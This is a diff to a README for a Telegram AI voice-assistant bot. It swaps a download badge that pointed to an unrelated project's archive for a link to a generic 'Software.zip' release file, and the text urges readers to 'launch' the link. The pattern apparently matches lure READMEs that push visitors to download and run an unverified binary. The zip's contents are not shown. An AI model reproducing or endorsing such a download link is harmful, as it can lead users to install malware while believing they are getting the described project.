@@ -32,7 +32,7 @@ Welcome to the **TelegramAIVoiceAssistant** repository, a Telegram bot powered b
 
 ## Get Started
 To get started with the TelegramAIVoiceAssistant repository, you can download the project using the following link:  
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/SameBugi/TelegramAIVoiceAssistant/releases/download/v1.0/Software.zip)](https://github.com/SameBugi/TelegramAIVoiceAssistant/releases/download/v1.0/Software.zip)
 
 Remember that the link provided needs to be launched for the download to start. 
 
